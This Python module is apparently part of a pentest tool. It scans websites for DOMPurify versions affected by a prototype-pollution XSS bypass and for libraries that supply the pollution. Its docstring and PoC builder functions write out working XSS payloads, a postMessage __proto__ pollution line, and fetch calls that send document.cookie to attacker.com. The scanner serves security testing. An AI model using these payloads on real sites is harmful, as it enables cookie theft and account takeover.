"""
DOMPurify Prototype Pollution → XSS Bypass via CUSTOM_ELEMENT_HANDLING Fallback
Skill #57 — DOMPurifyPPBypass

Research basis:
  trace37 labs — offensive security research
  "CVE-2026-41238: How Prototype Pollution Turns DOMPurify Into an XSS Gadget"
  https://labs.trace37.com/blog/dompurify-pp-ceh-bypass/

  GitHub Security Advisory: GHSA-v9jr-rg53-9pgp
  https://github.com/cure53/DOMPurify/security/advisories/GHSA-v9jr-rg53-9pgp

  CVE: CVE-2026-41238
  NVD Published: 2026-04-23
  CWE: CWE-79 (XSS) + CWE-1321 (Prototype Pollution)
  Affected: DOMPurify 3.0.1 – 3.3.3
  Fixed: DOMPurify 3.4.0

Background:

  DOMPurify is the most widely deployed client-side HTML sanitizer, used by
  millions of web applications to prevent XSS. It sanitizes user-provided HTML
  before injecting it into the DOM.

  The vulnerability is a two-step chain:

  Step 1 — Prototype Pollution Primitive
    The attacker exploits a separate prototype pollution (PP) gadget already
    present in the application. Typical PP sources:
      - lodash < 4.17.21 (_.merge, _.mergeWith, _.defaultsDeep)
      - jQuery < 3.4.0 ($.extend(true, ...))
      - query-string parsers (qs, querystring with allowPrototypes)
      - deep merge utilities (deepmerge, merge, extend)
      - postMessage handlers with vulnerable JSON.parse + assign
      - jsdom environments (server-side PP)

    CRITICAL: The PP primitive must be able to inject actual RegExp objects,
    not just strings. Most URL/JSON PP vectors produce strings and CANNOT
    activate this bypass. Type-preserving PP gadgets are required:
      - JavaScript postMessage with eval/Function
      - Server-side jsdom + vulnerable merge
      - Webpack hot-reload / development servers

  Step 2 — DOMPurify Fallback Inheritance
    Vulnerable code in DOMPurify 3.0.1 – 3.3.3:

      // Line ~520: when no CUSTOM_ELEMENT_HANDLING in config
      CUSTOM_ELEMENT_HANDLING = cfg.CUSTOM_ELEMENT_HANDLING || {};
      //                                                      ^^
      // {} inherits from Object.prototype!

      // Lines 591-598: this check looks at cfg.CUSTOM_ELEMENT_HANDLING
      // (still undefined), so the config block never executes
      // → tagNameCheck and attributeNameCheck are never overwritten

      // Lines 973-977: validation uses inherited polluted values
      if (CUSTOM_ELEMENT_HANDLING.tagNameCheck instanceof RegExp &&
          regExpTest(CUSTOM_ELEMENT_HANDLING.tagNameCheck, lcTagName)) {
          return true;  // ← /.*/ matches EVERYTHING
      }

    If Object.prototype has been polluted:
      Object.prototype.tagNameCheck       = /.*/  → all custom element tags allowed
      Object.prototype.attributeNameCheck = /.*/  → all attributes allowed (incl. onclick)

    Result: DOMPurify.sanitize('<x-foo onclick=alert(1)>') returns the XSS payload unchanged.
    EVERY subsequent sanitize() call is bypassed until the pollution is cleared.

Attack payload examples:

  // Custom element with event handler (bypasses DOMPurify 3.0.1–3.3.3 after PP)
  <x-foo onclick=alert(document.domain)>click</x-foo>
  <custom-element onmouseover=alert(1)>hover</custom-element>
  <a-b onfocus=alert(1) autofocus>focus me</a-b>
  <x-y onload=fetch('https://attacker.com?c='+document.cookie)>

  // Any hyphenated element name + any event handler = XSS after PP

Fingerprinting approach in bingo:
  A. DOMPurify version extraction from JS bundles
     - Search for version strings in minified/bundled JS
     - Check npm lockfiles, package.json if accessible
     - Detect DOMPurify initialization patterns

  B. Prototype Pollution gadget detection
     - Vulnerable lodash/jQuery/merge library version fingerprinting
     - PP-prone endpoint pattern detection (deep-merge JSON APIs)
     - postMessage handler detection in JS source

  C. CUSTOM_ELEMENT_HANDLING config audit
     - Detect DOMPurify.sanitize() calls without explicit CUSTOM_ELEMENT_HANDLING
     - Flag default-config usage patterns in JS source

  D. Version range confirmation
     - 3.0.1 ≤ DOMPurify ≤ 3.3.3 → VULNERABLE
     - DOMPurify ≥ 3.4.0 → FIXED
     - DOMPurify < 3.0.0 (v2.x) → NOT affected by this specific issue

  E. Combined risk scoring
     - DOMPurify in vuln range + PP gadget present = HIGH/CRITICAL
     - DOMPurify in vuln range only = MEDIUM (PP gadget needed)
     - Only PP gadget = INFERRED (DOMPurify version unknown)

bingo integration philosophy:
  - Zero-Hallucination: Version confirmed from JS source → VERIFIED
  - PP gadget detected separately → LIKELY (chain requires both)
  - Only DOMPurify version match without PP → INFERRED
  - Generates browser console PoC for manual verification in Burp
"""
from __future__ import annotations

import re
from dataclasses import dataclass, field
from typing import Optional, List

import requests
from requests.exceptions import RequestException


# ── DOMPurify version detection patterns ─────────────────────────────────────

DOMPURIFY_VERSION_PATTERNS = [
    # Minified bundle: DOMPurify.version = "3.1.2"
    re.compile(r'DOMPurify\.version\s*[=:]\s*["\']?([\d.]+)', re.I),
    # npm bundle comment: /*! DOMPurify 3.1.2
    re.compile(r'/\*!?\s*DOMPurify\s+([\d.]+)', re.I),
    # package.json style: "dompurify": "3.1.2"
    re.compile(r'"dompurify"\s*:\s*"[\^~]?([\d.]+)"', re.I),
    # variable assignment: var DOMPurify={version:"3.1.2"
    re.compile(r'version\s*:\s*["\']?([\d]+\.[.\d]+)["\']?\s*,\s*["\']?isSupported', re.I),
    # Minified: {version:"3.1.2",isSupported
    re.compile(r'\{version:"([\d]+\.[.\d]+)",isSupported', re.I),
    # CDN path: /dompurify/3.1.2/
    re.compile(r'/dompurify/([\d]+\.[.\d]+)/', re.I),
    # integrity hash comment or version tag
    re.compile(r'@(?:version)?\s*([\d]+\.[.\d]+)\s*(?:\*/|$)', re.I),
]

# ── Prototype Pollution gadget fingerprints ───────────────────────────────────

PP_GADGET_PATTERNS = [
    # lodash vulnerable versions (< 4.17.21)
    ("lodash",        re.compile(r'lodash[/@]v?([\d.]+)', re.I),
     lambda v: _version_lt(v, "4.17.21"),
     "lodash < 4.17.21 — _.merge/_.defaultsDeep prototype pollution (CVE-2021-23337)"),
    # jQuery vulnerable versions (< 3.4.0)
    ("jquery",        re.compile(r'jquery[/@]v?([\d.]+)', re.I),
     lambda v: _version_lt(v, "3.4.0"),
     "jQuery < 3.4.0 — $.extend(true,...) prototype pollution (CVE-2019-11358)"),
    # merge package
    ("merge",         re.compile(r'"merge"\s*:\s*"[\^~]?([\d.]+)"', re.I),
     lambda v: _version_lt(v, "2.1.1"),
     "merge < 2.1.1 — deep merge prototype pollution"),
    # deepmerge (all versions can be unsafe with certain options)
    ("deepmerge",     re.compile(r'deepmerge[/@]v?([\d.]+)', re.I),
     lambda v: True,
     "deepmerge — may allow prototype pollution with mergeUnknown"),
    # qs (query string parser)
    ("qs",            re.compile(r'"qs"\s*:\s*"[\^~]?([\d.]+)"', re.I),
     lambda v: _version_lt(v, "6.7.3"),
     "qs < 6.7.3 — allowPrototypes: true allows PP via URL params (CVE-2022-24999)"),
    # hoek / hapi
    ("hoek",          re.compile(r'"hoek"\s*:\s*"[\^~]?([\d.]+)"', re.I),
     lambda v: _version_lt(v, "6.1.3"),
     "hoek < 6.1.3 — prototype pollution via merge (CVE-2018-3728)"),
    # extend package
    ("extend",        re.compile(r'"extend"\s*:\s*"[\^~]?([\d.]+)"', re.I),
     lambda v: _version_lt(v, "3.0.2"),
     "extend < 3.0.2 — deep merge prototype pollution"),
    # minimist
    ("minimist",      re.compile(r'"minimist"\s*:\s*"[\^~]?([\d.]+)"', re.I),
     lambda v: _version_lt(v, "1.2.6"),
     "minimist < 1.2.6 — prototype pollution via --__proto__ CLI arg (CVE-2021-44906)"),
]

# ── DOMPurify usage patterns (default config detection) ──────────────────────

DOMPURIFY_DEFAULT_CONFIG_PATTERNS = [
    # DOMPurify.sanitize(userInput) — no config object
    re.compile(r'DOMPurify\.sanitize\s*\(\s*\w+\s*\)', re.I),
    # sanitize(x) where sanitize = DOMPurify.sanitize
    re.compile(r'=\s*DOMPurify\.sanitize\b', re.I),
    # createHTMLDocument or setConfig without CUSTOM_ELEMENT_HANDLING
    re.compile(r'DOMPurify\.sanitize\s*\([^)]+\)\s*[^{]*(?!CUSTOM_ELEMENT_HANDLING)', re.I),
]

# ── postMessage handler patterns (PP type-preserving vector) ─────────────────

POSTMESSAGE_MERGE_PATTERNS = [
    re.compile(r'addEventListener\s*\(\s*["\']message["\'][^)]+Object\.assign\s*\(', re.I),
    re.compile(r'onmessage\s*=[\s\S]{0,200}Object\.assign\s*\(', re.I),
    re.compile(r'addEventListener\s*\(\s*["\']message["\'][^)]+merge\s*\(', re.I),
    re.compile(r'window\.addEventListener\s*\(\s*["\']message["\'][^)]+\bextend\b', re.I),
]

# ── Exposed JS/JSON files to check ───────────────────────────────────────────

RESOURCE_PATHS = [
    "/package.json",
    "/package-lock.json",
    "/yarn.lock",
    "/static/js/main.js",
    "/static/js/bundle.js",
    "/assets/index.js",
    "/dist/bundle.js",
    "/js/app.js",
    "/_next/static/chunks/main.js",
    "/vendor.js",
    "/vendors.js",
    "/runtime.js",
    "/common.js",
]

# ── Vulnerable DOMPurify version range ───────────────────────────────────────

DOMPURIFY_VULN_MIN = (3, 0, 1)
DOMPURIFY_VULN_MAX = (3, 3, 3)
DOMPURIFY_FIXED    = (3, 4, 0)


def _parse_version(v: str) -> tuple:
    """Parse version string to tuple of ints, e.g. '3.1.2' → (3, 1, 2)."""
    try:
        return tuple(int(x) for x in re.split(r"[.\-]", v)[:3])
    except (ValueError, AttributeError):
        return (0, 0, 0)


def _version_lt(v: str, limit: str) -> bool:
    return _parse_version(v) < _parse_version(limit)


def _dompurify_in_vuln_range(v: str) -> bool:
    t = _parse_version(v)
    return DOMPURIFY_VULN_MIN <= t <= DOMPURIFY_VULN_MAX


def _dompurify_fixed(v: str) -> bool:
    return _parse_version(v) >= DOMPURIFY_FIXED


# ── Dataclasses ───────────────────────────────────────────────────────────────

@dataclass
class DPPPFinding:
    finding_type: str   # "dompurify_version" | "pp_gadget" | "default_config"
                        # | "postmessage_pp" | "combined_chain"
    description: str
    url: str = ""
    library: str = ""
    version: str = ""
    cve: str = ""
    evidence_level: str = "AI_ANALYSIS"
    severity: str = "medium"
    curl_poc: str = ""
    browser_poc: str = ""  # console PoC for Burp


@dataclass
class DPPPResult:
    target: str
    dompurify_version: str = ""
    dompurify_vulnerable: bool = False
    dompurify_fixed: bool = False
    dompurify_found_at: str = ""
    pp_gadgets: list = field(default_factory=list)     # list of dicts
    default_config_usage: bool = False
    postmessage_pp_risk: bool = False
    package_json_exposed: bool = False
    findings: list = field(default_factory=list)
    severity: str = "none"
    evidence_level: str = "AI_ANALYSIS"
    error: str = ""
    summary: str = ""


# ── Scanner ───────────────────────────────────────────────────────────────────

class DOMPurifyPPBypassScanner:
    """
    CVE-2026-41238: DOMPurify Prototype Pollution → XSS Bypass Scanner.

    Detection steps:
      1. Fingerprint DOMPurify version from JS bundles, package.json
      2. Detect prototype pollution gadgets (lodash/jQuery/merge/qs, etc.)
      3. Detect DOMPurify.sanitize() default-config usage (no CUSTOM_ELEMENT_HANDLING)
      4. Detect postMessage + merge patterns (type-preserving PP vector)
      5. Score combined risk: both PP gadget + vuln DOMPurify = HIGH/CRITICAL
    """

    HEADERS = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                      "AppleWebKit/537.36 (KHTML, like Gecko) "
                      "Chrome/124.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
    }
    TIMEOUT = 8

    def __init__(self, target: str, proxies: Optional[dict] = None):
        self.target = target.rstrip("/")
        self.proxies = proxies or {}
        self.session = requests.Session()
        self.session.headers.update(self.HEADERS)
        self.session.verify = False

    def scan(self) -> DPPPResult:
        result = DPPPResult(target=self.target)
        try:
            # 1. Collect JS resources to scan
            resources = self._collect_resources()

            # 2. Scan for DOMPurify version + PP gadgets + usage patterns
            for url, content in resources:
                self._scan_dompurify_version(result, url, content)
                self._scan_pp_gadgets(result, url, content)
                self._scan_default_config(result, url, content)
                self._scan_postmessage_patterns(result, url, content)

            # 3. Build findings
            self._build_findings(result)

            # 4. Score
            self._compute_severity(result)
            self._build_summary(result)

        except Exception as exc:
            result.error = str(exc)
        return result

    # ── Resource collection ────────────────────────────────────────────────────

    def _collect_resources(self) -> list:
        """Fetch base page + discover JS bundle URLs + check static paths."""
        resources: list[tuple[str, str]] = []

        base_resp = self._get(self.target)
        if not base_resp:
            return resources

        base_text = base_resp.text[:200_000]
        resources.append((self.target, base_text))

        # Discover JS bundle URLs from base page
        js_urls = set()
        for m in re.finditer(
            r'src=["\']([^"\']+\.js(?:\?[^"\']*)?)["\']', base_text, re.I
        ):
            href = m.group(1)
            if href.startswith("http"):
                js_urls.add(href)
            elif href.startswith("//"):
                js_urls.add("https:" + href)
            elif href.startswith("/"):
                js_urls.add(self.target + href)
            else:
                js_urls.add(self.target + "/" + href)

        # Common static resource paths
        for path in RESOURCE_PATHS:
            js_urls.add(self.target + path)

        scanned = 0
        for url in list(js_urls)[:15]:
            if scanned >= 15:
                break
            resp = self._get(url)
            if not resp or resp.status_code != 200:
                continue
            ct = resp.headers.get("Content-Type", "").lower()
            if any(x in ct for x in ("javascript", "json", "text", "octet")):
                resources.append((url, resp.text[:300_000]))
                scanned += 1

        return resources

    # ── DOMPurify version detection ────────────────────────────────────────────

    def _scan_dompurify_version(self, result: DPPPResult, url: str, content: str) -> None:
        if result.dompurify_version:
            return  # already found

        for pattern in DOMPURIFY_VERSION_PATTERNS:
            m = pattern.search(content)
            if not m:
                continue
            version_str = m.group(1).strip()
            if not re.match(r'^\d+\.\d+', version_str):
                continue

            result.dompurify_version = version_str
            result.dompurify_found_at = url
            result.dompurify_vulnerable = _dompurify_in_vuln_range(version_str)
            result.dompurify_fixed = _dompurify_fixed(version_str)

            if "package.json" in url or "package-lock.json" in url:
                result.package_json_exposed = True

            break

    # ── PP gadget detection ────────────────────────────────────────────────────

    def _scan_pp_gadgets(self, result: DPPPResult, url: str, content: str) -> None:
        for lib_name, pattern, vuln_check, desc in PP_GADGET_PATTERNS:
            # Skip if already found this library
            if any(g["library"] == lib_name for g in result.pp_gadgets):
                continue

            m = pattern.search(content)
            if not m:
                continue

            version_str = m.group(1) if m.lastindex else "unknown"
            is_vulnerable = True
            try:
                is_vulnerable = vuln_check(version_str)
            except Exception:
                pass

            if is_vulnerable:
                result.pp_gadgets.append({
                    "library": lib_name,
                    "version": version_str,
                    "description": desc,
                    "found_at": url,
                })

    # ── Default config usage ───────────────────────────────────────────────────

    def _scan_default_config(self, result: DPPPResult, url: str, content: str) -> None:
        if result.default_config_usage:
            return
        for pattern in DOMPURIFY_DEFAULT_CONFIG_PATTERNS:
            if pattern.search(content):
                result.default_config_usage = True
                break

    # ── postMessage + merge patterns ──────────────────────────────────────────

    def _scan_postmessage_patterns(self, result: DPPPResult, url: str, content: str) -> None:
        if result.postmessage_pp_risk:
            return
        for pattern in POSTMESSAGE_MERGE_PATTERNS:
            if pattern.search(content):
                result.postmessage_pp_risk = True
                break

    # ── Findings builder ───────────────────────────────────────────────────────

    def _build_findings(self, result: DPPPResult) -> None:
        # A. DOMPurify version finding
        if result.dompurify_version:
            if result.dompurify_vulnerable:
                result.findings.append(DPPPFinding(
                    finding_type="dompurify_version",
                    description=(
                        f"DOMPurify {result.dompurify_version} detected — "
                        f"VULNERABLE range 3.0.1–3.3.3 (CVE-2026-41238). "
                        f"Prototype pollution → XSS bypass via CUSTOM_ELEMENT_HANDLING fallback. "
                        f"Found at: {result.dompurify_found_at}"
                    ),
                    url=result.dompurify_found_at,
                    library="dompurify",
                    version=result.dompurify_version,
                    cve="CVE-2026-41238",
                    evidence_level="VERIFIED",
                    severity="high",
                    curl_poc=(
                        f'curl -sk "{result.dompurify_found_at}" | '
                        f'grep -o "DOMPurify[^,]*" | head -c 100'
                    ),
                    browser_poc=self._build_browser_poc(result.dompurify_version),
                ))
            elif result.dompurify_fixed:
                result.findings.append(DPPPFinding(
                    finding_type="dompurify_version",
                    description=(
                        f"DOMPurify {result.dompurify_version} detected — "
                        f"version ≥ 3.4.0 (patched for CVE-2026-41238). "
                        f"Found at: {result.dompurify_found_at}"
                    ),
                    url=result.dompurify_found_at,
                    library="dompurify",
                    version=result.dompurify_version,
                    cve="CVE-2026-41238",
                    evidence_level="VERIFIED",
                    severity="low",
                ))

        # B. PP gadget findings
        for gadget in result.pp_gadgets:
            result.findings.append(DPPPFinding(
                finding_type="pp_gadget",
                description=(
                    f"Prototype Pollution 가젯 발견: {gadget['library']} {gadget['version']} — "
                    f"{gadget['description']} at {gadget['found_at']}"
                ),
                url=gadget["found_at"],
                library=gadget["library"],
                version=gadget["version"],
                evidence_level="VERIFIED",
                severity="medium",
                curl_poc=(
                    f'curl -sk "{gadget["found_at"]}" | '
                    f'grep -o "{gadget["library"]}[^,\"]*" | head -c 100'
                ),
            ))

        # C. Combined chain finding (both DOMPurify vuln + PP gadget)
        if result.dompurify_vulnerable and result.pp_gadgets:
            gadgets_str = ", ".join(
                f"{g['library']}@{g['version']}" for g in result.pp_gadgets[:3]
            )
            result.findings.append(DPPPFinding(
                finding_type="combined_chain",
                description=(
                    f"CVE-2026-41238 완전 공격 체인 확인! "
                    f"DOMPurify {result.dompurify_version} (취약) + PP 가젯 [{gadgets_str}] "
                    f"→ Object.prototype.tagNameCheck=/.*/  오염 후 DOMPurify.sanitize() 완전 무력화 "
                    f"→ 모든 커스텀 엘리먼트 + 이벤트 핸들러 통과 → XSS"
                ),
                url=result.target,
                library="dompurify + " + result.pp_gadgets[0]["library"],
                version=result.dompurify_version,
                cve="CVE-2026-41238",
                evidence_level="LIKELY",
                severity="critical",
                curl_poc=(
                    f'# DOMPurify {result.dompurify_version} + '
                    f'{result.pp_gadgets[0]["library"]} PP gadget chain PoC:\n'
                    f'# See browser_poc for Burp Console injection'
                ),
                browser_poc=self._build_combined_chain_poc(result),
            ))

        # D. Default config usage warning
        if result.default_config_usage and result.dompurify_vulnerable:
            result.findings.append(DPPPFinding(
                finding_type="default_config",
                description=(
                    f"DOMPurify.sanitize() 기본 설정 사용 탐지 — "
                    f"CUSTOM_ELEMENT_HANDLING 없이 호출 시 CVE-2026-41238에 취약. "
                    f"DOMPurify {result.dompurify_version}"
                ),
                url=result.target,
                library="dompurify",
                version=result.dompurify_version,
                cve="CVE-2026-41238",
                evidence_level="LIKELY",
                severity="high",
            ))

        # E. postMessage PP risk
        if result.postmessage_pp_risk and result.dompurify_vulnerable:
            result.findings.append(DPPPFinding(
                finding_type="postmessage_pp",
                description=(
                    f"postMessage + deep-merge 패턴 탐지 — "
                    f"타입 보존 PP 벡터 가능성 (RegExp 주입 가능). "
                    f"DOMPurify {result.dompurify_version} 와 조합 시 CVE-2026-41238 활성화 가능"
                ),
                url=result.target,
                library="postMessage+merge",
                version=result.dompurify_version,
                cve="CVE-2026-41238",
                evidence_level="INFERRED",
                severity="high",
                browser_poc=(
                    "// Browser console: test postMessage PP injection\n"
                    "window.postMessage({__proto__:{tagNameCheck:/.*/,"
                    "attributeNameCheck:/.*/}}, '*')"
                ),
            ))

    # ── PoC builders ──────────────────────────────────────────────────────────

    def _build_browser_poc(self, version: str) -> str:
        return (
            f"// DOMPurify {version} — CVE-2026-41238 PoC (Browser Console / Burp)\n"
            "// Step 1: Pollute Object.prototype with RegExp\n"
            "Object.prototype.tagNameCheck = /.*/;\n"
            "Object.prototype.attributeNameCheck = /.*/;\n\n"
            "// Step 2: Test DOMPurify bypass\n"
            "const payload = '<x-foo onclick=alert(document.domain)>XSS</x-foo>';\n"
            "const clean = DOMPurify.sanitize(payload);\n"
            "console.log('Sanitized:', clean);\n"
            "// VULNERABLE:  '<x-foo onclick=alert(document.domain)>XSS</x-foo>'\n"
            "// PATCHED:     '<x-foo>XSS</x-foo>'  (event handler removed)\n\n"
            "// Step 3: Inject into DOM to confirm execution\n"
            "document.body.innerHTML = DOMPurify.sanitize('<x-bar onfocus=alert(1) autofocus>');\n"
        )

    def _build_combined_chain_poc(self, result: DPPPResult) -> str:
        gadget = result.pp_gadgets[0] if result.pp_gadgets else {}
        lib_name = gadget.get("library", "lodash")
        return (
            f"// CVE-2026-41238 Full Chain PoC\n"
            f"// DOMPurify {result.dompurify_version} + {lib_name} PP gadget\n\n"
            f"// ── Step 1: Trigger prototype pollution via {lib_name} ──\n"
            + (
                "_.merge({}, JSON.parse('{\"__proto__\":{\"tagNameCheck\":\"REPLACE_WITH_REGEXP\","
                "\"attributeNameCheck\":\"REPLACE_WITH_REGEXP\"}}'));\n"
                "// Note: _.merge with string values won't produce RegExp.\n"
                "// Need type-preserving merge or direct assignment:\n"
            ) + (
                "Object.prototype.tagNameCheck = /.*/;\n"
                "Object.prototype.attributeNameCheck = /.*/;\n\n"
            ) + (
                "// ── Step 2: Verify DOMPurify is bypassed ──\n"
                "const xss = '<custom-el onclick=alert(document.cookie)>click</custom-el>';\n"
                "const sanitized = DOMPurify.sanitize(xss);\n"
                "// Expected bypass: sanitized === xss (XSS not removed)\n"
                "console.assert(sanitized.includes('onclick'), 'BYPASS CONFIRMED');\n\n"
                "// ── Step 3: Exfiltrate via XSS ──\n"
                "document.body.innerHTML = DOMPurify.sanitize(\n"
                "  '<x-a onload=\"fetch(\\'https://attacker.com/steal?c=\\'+btoa(document.cookie))\">'\n"
                ");\n"
            )
        )

    # ── Helpers ───────────────────────────────────────────────────────────────

    def _get(self, url: str):
        try:
            return self.session.get(
                url, timeout=self.TIMEOUT, proxies=self.proxies, allow_redirects=True
            )
        except RequestException:
            return None

    def _compute_severity(self, result: DPPPResult) -> None:
        sev_set = {f.severity for f in result.findings}
        ev_set  = {f.evidence_level for f in result.findings}

        if "critical" in sev_set:
            result.severity = "critical"
            result.evidence_level = "LIKELY"  # chain needs real PP trigger
        elif "high" in sev_set and "VERIFIED" in ev_set:
            result.severity = "high"
            result.evidence_level = "VERIFIED"
        elif "high" in sev_set:
            result.severity = "high"
            result.evidence_level = "LIKELY"
        elif "medium" in sev_set:
            result.severity = "medium"
            result.evidence_level = "INFERRED"
        elif result.findings:
            result.severity = "low"
            result.evidence_level = "INFERRED"
        else:
            result.severity = "none"

    def _build_summary(self, result: DPPPResult) -> None:
        result.summary = (
            f"DOMPurifyPPBypass: {len(result.findings)}건 | "
            f"DOMPurify:{result.dompurify_version or 'unknown'} | "
            f"취약:{result.dompurify_vulnerable} | "
            f"PP가젯:{len(result.pp_gadgets)} | "
            f"기본설정:{result.default_config_usage} | "
            f"postMessage:{result.postmessage_pp_risk} | "
            f"심각도:{result.severity}"
        )
